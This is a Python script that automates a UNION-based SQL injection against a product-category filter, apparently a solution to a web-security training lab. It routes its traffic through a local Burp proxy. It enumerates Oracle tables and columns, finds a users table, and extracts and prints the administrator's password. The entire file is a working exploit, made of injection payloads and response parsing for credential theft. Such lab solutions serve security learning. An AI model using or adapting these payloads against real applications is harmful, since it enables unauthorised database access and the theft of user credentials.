import requests
from bs4 import BeautifulSoup
import sys
import re
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path = '/filter?category=Corporate+gifts'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text



def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name,NULL FROM all_tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
   # users_table = soup.find(text=re.compile('.*USERS.*'))
    users_table = soup.find(text=re.compile(r'\bUSERS_\w*'))   #\b determine that the users string will in the bigining and \w dtermine the rest charracter after the give string
    print(users_table)
    if users_table:
        return users_table
    else:
        return False



def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    print(password_column)
    return username_column, password_column






def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password






if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)
    else:
        url = sys.argv[1].strip()
        print("Looking for a users table...")
        users_table = sqli_users_table(url)
       
        if users_table:
            
            print("Found the users table name: %s" % users_table)
            #step 5
            
            username_column, password_column = sqli_users_columns(url, users_table)
            
            if username_column and password_column:
                
                print("Found the username column name: %s" % username_column)
                print("Found the password column name: %s" % password_column)
                
                #step 6
                
                admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
                
                if admin_password:
                    print("[+] The administrator password is: %s" % admin_password)
                else:
                    print("[-] Failed to retrieve administrator password.")
            else:
                print("[-] Failed to find username or password column.")
        else:
            print("[-] Failed to find users table.")
